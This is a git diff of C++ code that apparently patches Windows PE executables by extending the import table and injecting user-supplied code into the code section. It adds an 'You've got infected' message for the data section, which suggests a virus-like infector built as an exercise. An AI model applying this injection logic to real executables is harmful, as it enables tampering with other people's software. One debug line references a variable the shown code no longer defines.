@@ -17,6 +17,7 @@ vector<int> offsetOfFirstThunk;
 int diffRVAandOffset;
 vector<vector<int> > RVAOfFunction;
 map<string, vector<int> > assemblySyntax;
+vector<int> RVAuserData;
 
 bool canAddCode = true;
 
@@ -164,13 +165,13 @@ vector<int> addImportFunctions() {
     offsetInDataDicrectory["RVAImportTable"] = RVAImportTable;
     getImportSectionData();
     int offsetImportTable = offsetInDataDicrectory["offsetImportTable"];
-    int sizeOfImportTable = offsetInDataDicrectory["sizeImportTable"];
+    int sizeOfImportSection = offsetInDataDicrectory["sizeImportTable"];
 
     diffRVAandOffset = offsetImportTable - RVAImportTable;
     //@ Fomular RVA = [offset] - diffRVAandOffset + imageBase;
 
-    // printf("RVAImportTable: %.8X\t\t", RVAImportTable);
-    // printf("offsetImportTable: %.8X\t\t\n\n", offsetImportTable);
+    printf("RVAImportTable: %.8X\t\t", RVAImportTable);
+    printf("offsetImportTable: %.8X\t\t\n\n", offsetImportTable);
 
     int firstOffsetImportTable = offsetImportTable;
     int numberOfIID = 0;
@@ -193,15 +194,18 @@ vector<int> addImportFunctions() {
     int spaceForRVA = calSpaceForRVA();
     int spaceNeed = spaceForIID + spaceForDllFuntion + spaceForRVA;
 
-    int lastOffsetImportSection = firstOffsetImportTable + sizeOfImportTable - 1;
-    // printf("firstOffsetImportTable: %.8X\t\t", firstOffsetImportTable);
-    // printf("lastOffsetImportTable: %.8X\t\t\n\n", lastOffsetImportTable);
-    // printf("sizeOfImportTable: %.8X\n\n", sizeOfImportTable);
-    // printf("lastOffsetImportSection: %.8X\n\n", lastOffsetImportSection);
-    // printf("spaceNeed: %.8X\n\n", spaceNeed);
+    int sectionAlignment = getValueOfField("sectionAlignment", offsetOfPE);
+    int firstOffsetImportSection = offsetInDataDicrectory["rawAddressImportSection"];
+    int lastOffsetImportSection = firstOffsetImportSection + sizeOfImportSection - 1;
+    printf("firstOffsetImportTable: %.8X\t\t", firstOffsetImportTable);
+    printf("lastOffsetImportTable: %.8X\t\t\n\n", lastOffsetImportTable);
+    printf("sizeOfImportSection: %.8X\n\n", sizeOfImportSection);
+    printf("firstOffsetImportSection: %.8X\n\n", firstOffsetImportSection);
+    printf("lastOffsetImportSection: %.8X\n\n", lastOffsetImportSection);
+    printf("spaceNeed: %.8X\n\n", spaceNeed);
     int startOffset = lastOffsetImportSection - spaceNeed + 1;
     startOffset = (startOffset / 16) * 16;
-    // printf("startOffset: %.8X\n", startOffset);
+    printf("startOffset: %.8X\n", startOffset);
 
     //@ Must keep this order of getting data
     vector<int> dataOfIID = getRawValueFromFileData(firstOffsetImportTable, IIDSpace);
@@ -267,6 +271,11 @@ int getOffsetOfCodeSection() {
         offsetOfSection += sizeOfOneSection;
     }
     return 0;
+}
+
+void addUserDataToDataSection() {
+    vector<int> message = {0x59, 0x6f, 0x75, 0x27, 0x76, 0x65, 0x20, 0x67, 0x6f, 0x74, 0x20, 0x69, 0x6e, 0x66, 0x65, 0x63, 0x74, 0x65, 0x64, 0x00}; // You've got infected
+    
 }
 
 void initAssemblySyntax() {
@@ -337,8 +346,8 @@ vector<int> addCode(vector<int> rawData) {
     }
 
     // Add Code
-    vector<int> userCode = getUserCode();
     int lastOffsetCodeSection = rawOffsetCodeSection + rawSizeDataCodeSection - 1;
+    vector<int> userCode = getUserCode();
     int startOffset = lastOffsetCodeSection - userCode.size() + 1;
     startOffset = (startOffset / 16) * 16;
 
@@ -368,6 +377,7 @@ vector<int> addCodeToFile() {
         return outputData;
     }
 
+    addUserDataToDataSection();
     outputData = addCode(outputData);
     return outputData;
 }
